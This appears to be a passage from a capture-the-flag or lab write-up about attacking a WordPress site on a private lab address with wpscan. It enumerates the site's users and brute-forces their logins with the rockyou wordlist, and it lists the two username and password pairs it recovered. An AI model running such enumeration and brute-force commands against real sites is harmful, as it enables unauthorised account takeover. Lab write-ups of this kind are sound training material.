3.2 Wpscan

Use wpscan to find more about Wordpress

a) With this command, we are telling the wpscan to enumerate(-e) all themes(at), all plugins(ap) installed on the wordpress site. And finally, all the users(u) that might be logged in on the WordPress Site.

$ wpscan --url http://192.168.12.36/ -e at -e ap -e u


Output:



We see 5 User entryies.
1. admin
2. gillian
3. peter
4. barney
5. stephen

b) On Kali Machine create a file called “users.txt” with the users names.

$ gedit users.txt


c) Bruteforce attack against 5 users ( -U parameter our user list file directory) and ( -P parameter use password wordlists file )

$ wpscan --url http://192.168.12.36 -U users.txt -P /usr/share/wordlists/rockyou.txt


After having several coffees, we found two usernames and passwords.

• Username: barney
• Password: spooky1
• username: stephen
• password: apollo1
